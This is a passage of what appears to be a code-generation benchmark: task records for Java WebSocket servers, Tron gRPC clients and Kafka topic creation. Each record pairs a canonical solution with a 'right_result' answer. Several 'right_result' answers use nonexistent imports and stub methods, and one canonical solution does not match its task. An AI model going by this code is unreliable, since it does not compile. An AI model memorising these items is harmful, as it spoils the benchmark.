    "Instruction": "Task Description: Create a WebSocket server class that handles client connections, messages, and disconnections using the org.java_websocket library. The server should echo received messages back to clients and maintain a connection counter.\n\nClass Description: AutobahnSSLServerTest is a WebSocket server implementation that extends WebSocketServer from the org.java_websocket library. It handles client connections by maintaining a counter, processes incoming messages by echoing them back, and provides basic connection lifecycle management.\n\nAttributes:\n- counter: [int] - Static counter tracking the number of opened connections\n\nMethods:\n- Constructor: [AutobahnSSLServerTest](int port, Draft d) -> [void] - Creates a server instance bound to the specified port using the given WebSocket draft protocol\n- Constructor: [AutobahnSSLServerTest](InetSocketAddress address, Draft d) -> [void] - Creates a server instance bound to the specified address using the given WebSocket draft protocol\n- onOpen: [onOpen](WebSocket conn, ClientHandshake handshake) -> [void] - Handles new client connections, increments connection counter\n- onClose: [onClose](WebSocket conn, int code, String reason, boolean remote) -> [void] - Handles client disconnections\n- onError: [onError](WebSocket conn, Exception ex) -> [void] - Handles connection errors\n- onStart: [onStart]() -> [void] - Called when server starts successfully\n- onMessage: [onMessage](WebSocket conn, String message) -> [void] - Echoes received text messages back to the client\n- onMessage: [onMessage](WebSocket conn, ByteBuffer blob) -> [void] - Echoes received binary messages back to the client",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.util.Collections;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class AutobahnSSLServerTest extends WebSocketServer {\n\n    private static int counter = 0;\n\n    public AutobahnSSLServerTest(int port, Draft d) throws UnknownHostException {\n        super(new InetSocketAddress(port), Collections.singletonList(d));\n    }\n\n    public AutobahnSSLServerTest(InetSocketAddress address, Draft d) {\n        super(address, Collections.singletonList(d));\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        counter++;\n        System.out.println(\"///////////Opened connection number\" + counter);\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"closed\");\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        System.out.println(\"Error:\");\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started!\");\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        conn.send(message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer blob) {\n        conn.send(blob);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "import org.java_websocket.server.WebSocketServer;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.draft.Draft;\nimport org.java_websocket.exceptions.ConnectionException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\n\npublic class AutobahnSSLServerTest extends WebSocketServer {\n    public static int counter = 0;\n\n    public AutobahnSSLServerTest(int port, Draft d) {\n        super(port, d);\n    }\n\n    public AutobahnSSLServerTest(InetSocketAddress address, Draft d) {\n        super(address, d);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        counter++;\n        System.out.println(\"New connection: \" + counter);\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        counter--;\n        System.out.println(\"Connection closed: \" + counter);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started on port \" + getPort());\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        conn.send(message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer blob) {\n        conn.send(blob.array());\n    }\n}"
  },
  {
    "Task_id": 480,
    "Instruction": "Task Description: Create a WebSocket server implementation using the org.java_websocket library to handle client connections, messages, and disconnections.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends the WebSocketServer class from the org.java_websocket library. It provides lifecycle methods for managing WebSocket connections and handling communication events.\n\nAttributes:\n- address: InetSocketAddress - The network address and port on which the server listens for connections\n\nMethods:\n- Constructor: MyWebSocketServer(InetSocketAddress address) -> void - Initializes the WebSocket server with the specified address\n- onOpen: onOpen(WebSocket conn, ClientHandshake handshake) -> void - Called when a new WebSocket connection is established\n- onClose: onClose(WebSocket conn, int code, String reason, boolean remote) -> void - Called when a WebSocket connection is closed\n- onMessage: onMessage(WebSocket conn, String message) -> void - Called when a message is received from a WebSocket client\n- onError: onError(WebSocket conn, Exception ex) -> void - Called when an error occurs with a WebSocket connection\n- onStart: onStart() -> void - Called when the server starts successfully",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    public MyWebSocketServer(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        // Handle new WebSocket connection\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        // Handle WebSocket connection closing\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        // Handle incoming WebSocket message\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        // Handle WebSocket errors\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        // Handle server startup\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "import org.java_websocket.server.WebSocketServer;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.websocket.WebSocket;\n\npublic class MyWebSocketServer extends WebSocketServer {\n    public MyWebSocketServer(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        System.out.println(\"Connected: \" + conn.getRemoteAddress());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"Closed: \" + code + \" \" + reason);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received: \" + message);\n        conn.send(\"Echo: \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started\");\n    }\n}"
  },
  {
    "Task_id": 497,
    "Instruction": "Task Description: Create a Java class that implements a gRPC client for interacting with a database service, allowing for retrieval of blockchain data and dynamic properties.\n\nClass Description: The DatabaseGrpcClient class provides a gRPC client implementation for connecting to a database service. It establishes a connection to a gRPC server, provides methods to retrieve blockchain blocks and dynamic properties, and handles connection shutdown.\n\nAttributes:\n- channel: [ManagedChannel] - The communication channel between the client and the gRPC server\n- databaseBlockingStub: [DatabaseGrpc.DatabaseBlockingStub] - The blocking stub used to make synchronous RPC calls to the server\n\nMethods:\n- Constructor: [DatabaseGrpcClient](String host, int port) -> [void] - Creates a new client instance connecting to the specified host and port\n- Constructor: [DatabaseGrpcClient](String host) -> [void] - Creates a new client instance connecting to the specified host (using default port)\n- getBlock: [getBlock](long blockNum) -> [Block] - Retrieves a block from the blockchain; if blockNum is negative, returns the latest block\n- shutdown: [shutdown]() -> [void] - Shuts down the connection channel\n- getDynamicProperties: [getDynamicProperties]() -> [DynamicProperties] - Retrieves the dynamic properties of the blockchain",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport org.tron.api.DatabaseGrpc;\nimport org.tron.api.GrpcAPI.EmptyMessage;\nimport org.tron.api.GrpcAPI.NumberMessage;\nimport org.tron.protos.Protocol.Block;\nimport org.tron.protos.Protocol.DynamicProperties;\n\npublic class DatabaseGrpcClient {\n\n  private final ManagedChannel channel;\n  private final DatabaseGrpc.DatabaseBlockingStub databaseBlockingStub;\n\n  public DatabaseGrpcClient(String host, int port) {\n    channel = ManagedChannelBuilder.forAddress(host, port)\n        .usePlaintext()\n        .build();\n    databaseBlockingStub = DatabaseGrpc.newBlockingStub(channel);\n  }\n\n  public DatabaseGrpcClient(String host) {\n    channel = ManagedChannelBuilder.forTarget(host)\n        .usePlaintext()\n        .build();\n    databaseBlockingStub = DatabaseGrpc.newBlockingStub(channel);\n  }\n\n  public Block getBlock(long blockNum) {\n    if (blockNum < 0) {\n      return databaseBlockingStub.getNowBlock(EmptyMessage.newBuilder().build());\n    }\n    NumberMessage.Builder builder = NumberMessage.newBuilder();\n    builder.setNum(blockNum);\n    return databaseBlockingStub.getBlockByNum(builder.build());\n  }\n\n  public void shutdown() {\n    channel.shutdown();\n  }\n\n  public DynamicProperties getDynamicProperties() {\n    return databaseBlockingStub.getDynamicProperties(EmptyMessage.newBuilder().build());\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport com.example.database.DatabaseGrpc;\nimport com.example.database.Block;\nimport com.example.database.DynamicProperties;\nimport com.example.database.BlockRequest;\nimport com.example.database.BlockResponse;\nimport com.example.database.DynamicPropertiesRequest;\nimport com.example.database.DynamicPropertiesResponse;\n\npublic class DatabaseGrpcClient {\n    private final ManagedChannel channel;\n    private final DatabaseGrpc.DatabaseBlockingStub databaseBlockingStub;\n\n    public DatabaseGrpcClient(String host, int port) {\n        channel = ManagedChannelBuilder.forAddress(host, port).usePlaintext().build();\n        databaseBlockingStub = DatabaseGrpc.newBlockingStub(channel);\n    }\n\n    public DatabaseGrpcClient(String host) {\n        this(host, 50051);\n    }\n\n    public Block getBlock(long blockNum) {\n        if (blockNum < 0) {\n            return databaseBlockingStub.getBlock(BlockRequest.newBuilder().setBlockNum(0).build()).getBlock();\n        }\n        return databaseBlockingStub.getBlock(BlockRequest.newBuilder().setBlockNum(blockNum).build()).getBlock();\n    }\n\n    public void shutdown() {\n        channel.shutdown();\n    }\n\n    public DynamicProperties getDynamicProperties() {\n        return databaseBlockingStub.getDynamicProperties(DynamicPropertiesRequest.getDefaultInstance()).getDynamicProperties();\n    }\n}"
  },
  {
    "Task_id": 5,
    "Instruction": "Task Description: Create a Kafka topic using the AdminClient API in Java.\n\nFunction Description: This function creates a new topic in a Kafka cluster using the AdminClient API. It establishes a connection to the Kafka broker, defines the topic configuration (name, partition count, and replication factor), and creates the topic. The function ensures proper resource cleanup by closing the AdminClient after topic creation.\n\nInput:\n- brokerAddress: String - The address of the Kafka broker to connect to (e.g., \"localhost:9092\")\n- topicName: String - The name of the topic to be created\n- partitionCount: int - The number of partitions for the topic\n- replicationFactor: short - The replication factor for the topic\n\nOutput: void - The function does not return any value but creates the specified topic in the Kafka cluster. Any exceptions during topic creation will be thrown to the caller.\n\nNote: The function handles resource cleanup by closing the AdminClient in a finally block to prevent resource leaks.",
    "Canonical_solution": "import java.util.Collections;\nimport java.util.Map;\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.NewTopic;\n\npublic void testDiskFailure() throws IOException {\n    AdminClient adminClient = KafkaCruiseControlUtils.createAdminClient(Collections\n        .singletonMap(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, broker(0).plaintextAddr()));\n    try {\n        adminClient.createTopics(Collections.singleton(new NewTopic(TOPIC0, PARTITION_COUNT, TOPIC0_REPLICATION_FACTOR)));\n    } finally {\n        KafkaCruiseControlUtils.closeAdminClientWithTimeout(adminClient);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 34,
    "right_result": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport java.util.Arrays;\nimport java.util.Properties;\nimport java.util.List;\n\npublic class KafkaTopicCreator {\n    public void createTopic(String brokerAddress, String topicName, int partitionCount, short replicationFactor) throws Exception {\n        Properties props = new Properties();\n        props.put(\"bootstrap.servers\", brokerAddress);\n        AdminClient adminClient = null;\n        try {\n            adminClient = AdminClient.create(props);\n            NewTopic newTopic = new NewTopic(topicName, partitionCount, replicationFactor);\n            List<NewTopic> topics = Arrays.asList(newTopic);\n            var result = adminClient.createTopics(topics);\n            result.get();\n        } finally {\n            if (adminClient != null) {\n                adminClient.close();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 500,
    "Instruction": "Task Description: Create a gRPC client class in Java that connects to both full and solidity nodes of a blockchain network, allowing for transaction creation and broadcasting.\n\nClass Description: The GrpcClient class establishes gRPC connections to blockchain nodes (full and solidity) and provides methods for transaction operations. It manages channel lifecycle and provides blocking stub interfaces for synchronous communication.\n\nAttributes:\n- channelFull: [ManagedChannel] - Channel for connection to the full node\n- channelSolidity: [ManagedChannel] - Channel for connection to the solidity node\n- blockingStubFull: [WalletGrpc.WalletBlockingStub] - Blocking stub for full node operations\n- blockingStubSolidity: [WalletSolidityGrpc.WalletSolidityBlockingStub] - Blocking stub for solidity node operations\n- blockingStubExtension: [WalletExtensionGrpc.WalletExtensionBlockingStub] - Blocking stub for extension operations\n\nMethods:\n- GrpcClient(String fullnode, String soliditynode) -> [void] - Constructor that initializes connections to specified nodes\n- shutdown() -> [void] - Gracefully shuts down all active channels\n- createTransaction(AccountUpdateContract contract) -> [Transaction] - Creates a transaction using the full node stub\n- broadcastTransaction(Transaction signaturedTransaction) -> [boolean] - Broadcasts a signed transaction and returns operation result",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport java.util.concurrent.TimeUnit;\nimport org.tron.api.WalletGrpc;\nimport org.tron.api.WalletSolidityGrpc;\nimport org.tron.api.WalletExtensionGrpc;\n\npublic class GrpcClient {\n\n  private ManagedChannel channelFull = null;\n  private ManagedChannel channelSolidity = null;\n  private WalletGrpc.WalletBlockingStub blockingStubFull = null;\n  private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubSolidity = null;\n  private WalletExtensionGrpc.WalletExtensionBlockingStub blockingStubExtension = null;\n\n  public GrpcClient(String fullnode, String soliditynode) {\n    if (!(fullnode.isEmpty())) {\n      channelFull = ManagedChannelBuilder.forTarget(fullnode)\n          .usePlaintext()\n          .build();\n      blockingStubFull = WalletGrpc.newBlockingStub(channelFull);\n    }\n    if (!(soliditynode.isEmpty())) {\n      channelSolidity = ManagedChannelBuilder.forTarget(soliditynode)\n          .usePlaintext()\n          .build();\n      blockingStubSolidity = WalletSolidityGrpc.newBlockingStub(channelSolidity);\n      blockingStubExtension = WalletExtensionGrpc.newBlockingStub(channelSolidity);\n    }\n  }\n\n  public void shutdown() throws InterruptedException {\n    if (channelFull != null) {\n      channelFull.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n    }\n    if (channelSolidity != null) {\n      channelSolidity.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n    }\n  }\n\n  public Transaction createTransaction(AccountUpdateContract contract) {\n    return blockingStubFull.updateAccount(contract);\n  }\n\n  public boolean broadcastTransaction(Transaction signaturedTransaction) {\n    GrpcAPI.Return response = blockingStubFull.broadcastTransaction(signaturedTransaction);\n    return response.getResult();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport com.example.wallet.WalletGrpc;\nimport com.example.walletsolidity.WalletSolidityGrpc;\nimport com.example.extension.WalletExtensionGrpc;\nimport com.example.wallet.AccountUpdateContract;\nimport com.example.wallet.Transaction;\n\npublic class GrpcClient {\n    private final ManagedChannel channelFull;\n    private final ManagedChannel channelSolidity;\n    private final WalletGrpc.WalletBlockingStub blockingStubFull;\n    private final WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubSolidity;\n    private final WalletExtensionGrpc.WalletExtensionBlockingStub blockingStubExtension;\n\n    public GrpcClient(String fullnode, String soliditynode) {\n        this.channelFull = ManagedChannelBuilder.forAddress(fullnode).usePlaintext().build();\n        this.channelSolidity = ManagedChannelBuilder.forAddress(soliditynode).usePlaintext().build();\n        this.blockingStubFull = WalletGrpc.newBlockingStub(channelFull);\n        this.blockingStubSolidity = WalletSolidityGrpc.newBlockingStub(channelSolidity);\n        this.blockingStubExtension = WalletExtensionGrpc.newBlockingStub(channelFull);\n    }\n\n    public void shutdown() {\n        channelFull.shutdown();\n        channelSolidity.shutdown();\n    }\n\n    public Transaction createTransaction(AccountUpdateContract contract) {\n        return blockingStubFull.createTransaction(contract);\n    }\n\n    public boolean broadcastTransaction(Transaction signaturedTransaction) {\n        return blockingStubFull.broadcastTransaction(signaturedTransaction);\n    }\n}"
  },
  {
    "Task_id": 501,
    "Instruction": "Task Description: Create a gRPC client class in Java for interacting with a Tron blockchain wallet service, implementing various wallet operations through gRPC calls.\n\nClass Description: The WalletGrpcClient class provides a Java interface to interact with a Tron blockchain node's wallet service using gRPC. It handles connection management and provides methods for account queries, transaction creation, and blockchain data retrieval.\n\nAttributes:\n- channel: [ManagedChannel] - The gRPC communication channel to the server\n- walletBlockingStub: [WalletGrpc.WalletBlockingStub] - The blocking stub for making synchronous RPC calls\n\nMethods:\n- WalletGrpcClient(String host, int port) - Constructor - Creates a client connecting to specified host and port\n- WalletGrpcClient(String host) - Constructor - Creates a client connecting to specified host (using target format)\n- shutdown() -> void - Shuts down the channel with 5-second timeout\n- queryAccount(byte[] address) -> Account - Queries account information by address\n- createTransaction(TransferContract contract) -> Transaction - Creates a transfer transaction\n- createTransferAssetTransaction(TransferAssetContract contract) -> Transaction - Creates an asset transfer transaction\n- createParticipateAssetIssueTransaction(ParticipateAssetIssueContract contract) -> Transaction - Creates an asset participation transaction\n- createAssetIssue(AssetIssueContract contract) -> Transaction - Creates an asset issuance transaction\n- voteWitnessAccount(VoteWitnessContract contract) -> Transaction - Creates a witness voting transaction\n- createWitness(WitnessCreateContract contract) -> Transaction - Creates a witness creation transaction\n- broadcastTransaction(Transaction signedTransaction) -> boolean - Broadcasts a signed transaction to network\n- getBlock(long blockNum) -> Block - Retrieves block by number (or latest if negative)\n- listNodes() -> Optional<NodeList> - Lists connected nodes\n- getAssetIssueByAccount(byte[] address) -> Optional<AssetIssueList> - Gets assets issued by account\n- getAssetIssueByName(String assetName) -> AssetIssueContract - Gets asset by name\n- getAssetIssueListByName(String assetName) -> Optional<AssetIssueList> - Gets asset list by name\n- getAssetIssueById(String assetId) -> AssetIssueContract - Gets asset by ID",
    "Canonical_solution": "import com.google.protobuf.ByteString;\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport java.util.Optional;\nimport java.util.concurrent.TimeUnit;\nimport org.tron.api.GrpcAPI.AssetIssueList;\nimport org.tron.api.GrpcAPI.BytesMessage;\nimport org.tron.api.GrpcAPI.EmptyMessage;\nimport org.tron.api.GrpcAPI.NodeList;\nimport org.tron.api.GrpcAPI.NumberMessage;\nimport org.tron.api.GrpcAPI.Return;\nimport org.tron.api.WalletGrpc;\nimport org.tron.protos.Protocol.Account;\nimport org.tron.protos.Protocol.Block;\nimport org.tron.protos.Protocol.Transaction;\nimport org.tron.protos.contract.AssetIssueContractOuterClass.AssetIssueContract;\nimport org.tron.protos.contract.AssetIssueContractOuterClass.ParticipateAssetIssueContract;\nimport org.tron.protos.contract.AssetIssueContractOuterClass.TransferAssetContract;\nimport org.tron.protos.contract.BalanceContract.TransferContract;\nimport org.tron.protos.contract.WitnessContract.VoteWitnessContract;\nimport org.tron.protos.contract.WitnessContract.WitnessCreateContract;\n\npublic class WalletGrpcClient {\n\n  private final ManagedChannel channel;\n  private final WalletGrpc.WalletBlockingStub walletBlockingStub;\n\n  public WalletGrpcClient(String host, int port) {\n    channel = ManagedChannelBuilder.forAddress(host, port)\n        .usePlaintext()\n        .build();\n    walletBlockingStub = WalletGrpc.newBlockingStub(channel);\n  }\n\n  public WalletGrpcClient(String host) {\n    channel = ManagedChannelBuilder.forTarget(host)\n        .usePlaintext()\n        .build();\n    walletBlockingStub = WalletGrpc.newBlockingStub(channel);\n  }\n\n  public void shutdown() throws InterruptedException {\n    channel.shutdown().awaitTermination(5, TimeUnit.SECONDS);\n  }\n\n  public Account queryAccount(byte[] address) {\n    ByteString addressByteString = ByteString.copyFrom(address);\n    Account request = Account.newBuilder().setAddress(addressByteString).build();\n    return walletBlockingStub.getAccount(request);\n  }\n\n  public Transaction createTransaction(TransferContract contract) {\n    return walletBlockingStub.createTransaction(contract);\n  }\n\n  public Transaction createTransferAssetTransaction(TransferAssetContract contract) {\n    return walletBlockingStub.transferAsset(contract);\n  }\n\n  public Transaction createParticipateAssetIssueTransaction(\n      ParticipateAssetIssueContract contract) {\n    return walletBlockingStub.participateAssetIssue(contract);\n  }\n\n  public Transaction createAssetIssue(AssetIssueContract contract) {\n    return walletBlockingStub.createAssetIssue(contract);\n  }\n\n  public Transaction voteWitnessAccount(VoteWitnessContract contract) {\n    return walletBlockingStub.voteWitnessAccount(contract);\n  }\n\n  public Transaction createWitness(WitnessCreateContract contract) {\n    return walletBlockingStub.createWitness(contract);\n  }\n\n  public boolean broadcastTransaction(Transaction signedTransaction) {\n    Return response = walletBlockingStub.broadcastTransaction(signedTransaction);\n    return response.getResult();\n  }\n\n  public Block getBlock(long blockNum) {\n    if (blockNum < 0) {\n      return walletBlockingStub.getNowBlock(EmptyMessage.newBuilder().build());\n    }\n    NumberMessage.Builder builder = NumberMessage.newBuilder();\n    builder.setNum(blockNum);\n    return walletBlockingStub.getBlockByNum(builder.build());\n  }\n\n  public Optional<NodeList> listNodes() {\n    NodeList nodeList = walletBlockingStub\n        .listNodes(EmptyMessage.newBuilder().build());\n    if (nodeList != null) {\n      return Optional.of(nodeList);\n    }\n    return Optional.empty();\n  }\n\n  public Optional<AssetIssueList> getAssetIssueByAccount(byte[] address) {\n    ByteString addressByteString = ByteString.copyFrom(address);\n    Account request = Account.newBuilder().setAddress(addressByteString).build();\n    AssetIssueList assetIssueList = walletBlockingStub\n        .getAssetIssueByAccount(request);\n    if (assetIssueList != null) {\n      return Optional.of(assetIssueList);\n    }\n    return Optional.empty();\n  }\n\n  public AssetIssueContract getAssetIssueByName(String assetName) {\n    ByteString assetNameBs = ByteString.copyFrom(assetName.getBytes());\n    BytesMessage request = BytesMessage.newBuilder().setValue(assetNameBs).build();\n    return walletBlockingStub.getAssetIssueByName(request);\n  }\n\n  public Optional<AssetIssueList> getAssetIssueListByName(String assetName) {\n    ByteString assetNameBs = ByteString.copyFrom(assetName.getBytes());\n    BytesMessage request = BytesMessage.newBuilder().setValue(assetNameBs).build();\n\n    AssetIssueList assetIssueList = walletBlockingStub\n        .getAssetIssueListByName(request);\n    if (assetIssueList != null) {\n      return Optional.of(assetIssueList);\n    }\n    return Optional.empty();\n  }\n\n  public AssetIssueContract getAssetIssueById(String assetId) {\n    ByteString assetIdBs = ByteString.copyFrom(assetId.getBytes());\n    BytesMessage request = BytesMessage.newBuilder().setValue(assetIdBs).build();\n    return walletBlockingStub.getAssetIssueById(request);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 23,
    "right_result": "```java\nimport io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.stub.BlockingStub;\nimport com.tron.wallet.grpc.WalletGrpc;\nimport com.tron.wallet.grpc.WalletBlockingStub;\nimport com.tron.wallet.grpc.Account;\nimport com.tron.wallet.grpc.Transaction;\nimport com.tron.wallet.grpc.Block;\nimport com.tron.wallet.grpc.NodeList;\nimport com.tron.wallet.grpc.AssetIssueList;\nimport com.tron.wallet.grpc.AssetIssueContract;\nimport com.tron.wallet.grpc.TransferContract;\nimport com.tron.wallet.grpc.TransferAssetContract;\nimport com.tron.wallet.grpc.ParticipateAssetIssueContract;\nimport com.tron.wallet.grpc.AssetIssueContract;\nimport com.tron.wallet.grpc.WitnessCreateContract;\nimport com.tron.wallet.grpc.VoteWitnessContract;\nimport java.util.Optional;\nimport java.util.concurrent.TimeUnit;\n\npublic class WalletGrpcClient {\n    private final ManagedChannel channel;\n    private final WalletBlockingStub walletBlockingStub;\n\n    public WalletGrpcClient(String host, int port) {\n        this.channel = ManagedChannelBuilder.forAddress(host, port).usePlaintext().build();\n        this.walletBlockingStub = WalletGrpc.newBlockingStub(channel);\n    }\n\n    public WalletGrpcClient(String host) {\n        this.channel = ManagedChannelBuilder.forTarget(host).usePlaintext().build();\n        this.walletBlockingStub = WalletGrpc.newBlockingStub(channel);\n    }\n\n    public void shutdown() {\n        channel.shutdown();\n        try {\n            if (!channel.awaitTermination(5, TimeUnit.SECONDS)) {\n                channel.shutdownNow();\n            }\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public Account queryAccount(byte[] address) {\n        return walletBlockingStub.queryAccount(address);\n    }\n\n    public Transaction createTransaction(TransferContract contract) {\n        return walletBlockingStub.createTransaction(contract);\n    }\n\n    public Transaction createTransferAssetTransaction(TransferAssetContract contract) {\n        return walletBlockingStub.createTransferAssetTransaction(contract);\n    }\n\n    public Transaction createParticipateAssetIssueTransaction(ParticipateAssetIssueContract contract) {\n        return walletBlockingStub.createParticipateAssetIssueTransaction(contract);\n    }\n\n    public Transaction createAssetIssue(AssetIssueContract contract) {\n        return walletBlockingStub.createAssetIssue(contract);\n    }\n\n    public Transaction voteWitnessAccount(VoteWitnessContract contract) {\n        return walletBlockingStub.voteWitnessAccount(contract);\n    }\n\n    public Transaction createWitness(WitnessCreateContract contract) {\n        return walletBlockingStub.createWitness(contract);\n    }\n\n    public boolean broadcastTransaction(Transaction signedTransaction) {\n        return walletBlockingStub.broadcastTransaction(signedTransaction);\n    }\n\n    public Block getBlock(long blockNum) {\n        return walletBlockingStub.getBlock(blockNum);\n    }\n\n    public Optional<NodeList> listNodes() {\n        return Optional.ofNullable(walletBlockingStub.listNodes());\n    }\n\n    public Optional<AssetIssueList> getAssetIssueByAccount(byte[] address) {\n        return Optional.ofNullable(walletBlockingStub.getAssetIssueByAccount(address));\n    }\n\n    public AssetIssueContract getAssetIssueByName(String assetName) {\n        return walletBlockingStub.getAssetIssueByName(assetName);\n    }\n\n    public Optional<AssetIssueList> getAssetIssueListByName(String assetName) {\n        return Optional.ofNullable(walletBlockingStub.getAssetIssueListByName(assetName));\n    }\n\n    public AssetIssueContract getAssetIssueById(String assetId) {\n        return walletBlockingStub.getAssetIssueById(assetId);\n    }\n}\n```"
  },
  {
    "Task_id": 505,
    "Instruction": "Task Description: Create a Java class that implements a gRPC client for interacting with multiple TRON blockchain nodes (full node, solidity node, and PBFT node) to retrieve block information.\n\nClass Description: The GrpcClient class provides functionality to connect to different types of TRON blockchain nodes using gRPC protocol and retrieve block data from them. It manages multiple channel connections and provides blocking stub interfaces for synchronous calls.\n\nAttributes:\n- channelFull: [ManagedChannel] - Channel for connection to the full node\n- channelSolidity: [ManagedChannel] - Channel for connection to the solidity node\n- channelpBFT: [ManagedChannel] - Channel for connection to the PBFT node\n- blockingStubFull: [WalletGrpc.WalletBlockingStub] - Blocking stub for full node operations\n- blockingStubSolidity: [WalletSolidityGrpc.WalletSolidityBlockingStub] - Blocking stub for solidity node operations\n- blockingStubpBFT: [WalletSolidityGrpc.WalletSolidityBlockingStub] - Blocking stub for PBFT node operations\n\nMethods:\n- init: [void]([String fullnode, String solidityNode, String pBFTNode]) -> [void] - Initializes connections to all three node types by creating channels and stubs\n- getBlockFromFullNode: [GrpcAPI.Block]([long blockNum]) -> [GrpcAPI.Block] - Retrieves a block from the full node by block number\n- getBlockFromSolidityNode: [GrpcAPI.Block]([long blockNum]) -> [GrpcAPI.Block] - Retrieves a block from the solidity node by block number\n- getBlockFromPBFTNode: [GrpcAPI.Block]([long blockNum]) -> [GrpcAPI.Block] - Retrieves a block from the PBFT node by block number\n- shutdown: [void]([]) -> [void] - Gracefully shuts down all channel connections with a 5-second timeout",
    "Canonical_solution": "import io.grpc.ManagedChannel;\nimport io.grpc.ManagedChannelBuilder;\nimport io.grpc.StatusRuntimeException;\nimport java.util.concurrent.TimeUnit;\nimport org.tron.api.GrpcAPI;\nimport org.tron.api.WalletGrpc;\nimport org.tron.api.WalletSolidityGrpc;\n\npublic class GrpcClient {\n\n    private ManagedChannel channelFull;\n    private ManagedChannel channelSolidity;\n    private ManagedChannel channelpBFT;\n    private WalletGrpc.WalletBlockingStub blockingStubFull;\n    private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubSolidity;\n    private WalletSolidityGrpc.WalletSolidityBlockingStub blockingStubpBFT;\n\n    public void init(String fullnode, String solidityNode, String pBFTNode) {\n        channelFull = ManagedChannelBuilder.forTarget(fullnode)\n                .usePlaintext()\n                .build();\n        channelSolidity = ManagedChannelBuilder.forTarget(solidityNode)\n                .usePlaintext()\n                .build();\n        channelpBFT = ManagedChannelBuilder.forTarget(pBFTNode)\n                .usePlaintext()\n                .build();\n        blockingStubFull = WalletGrpc.newBlockingStub(channelFull);\n        blockingStubSolidity = WalletSolidityGrpc.newBlockingStub(channelSolidity);\n        blockingStubpBFT = WalletSolidityGrpc.newBlockingStub(channelpBFT);\n    }\n\n    public GrpcAPI.Block getBlockFromFullNode(long blockNum) throws StatusRuntimeException {\n        GrpcAPI.NumberMessage message = GrpcAPI.NumberMessage.newBuilder().setNum(blockNum).build();\n        return blockingStubFull.getBlockByNum(message);\n    }\n\n    public GrpcAPI.Block getBlockFromSolidityNode(long blockNum) throws StatusRuntimeException {\n        GrpcAPI.NumberMessage message = GrpcAPI.NumberMessage.newBuilder().setNum(blockNum).build();\n        return blockingStubSolidity.getBlockByNum(message);\n    }\n\n    public GrpcAPI.Block getBlockFromPBFTNode(long blockNum) throws StatusRuntimeException {\n        GrpcAPI.NumberMessage message = 